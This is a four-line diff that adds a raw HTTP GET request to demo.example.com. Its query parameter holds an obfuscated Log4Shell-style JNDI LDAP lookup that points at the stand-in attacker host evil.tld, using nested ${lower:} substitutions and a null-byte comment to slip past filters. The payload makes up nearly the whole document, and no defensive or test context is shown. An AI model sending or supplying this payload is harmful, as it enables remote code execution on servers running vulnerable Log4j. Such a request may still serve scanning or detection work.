@@ -1,0 +1,4 @@
+GET /a?id=${/*%00*/jndi:${lower:l}${lower:d}a${lower:p}://evil.tld/x} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
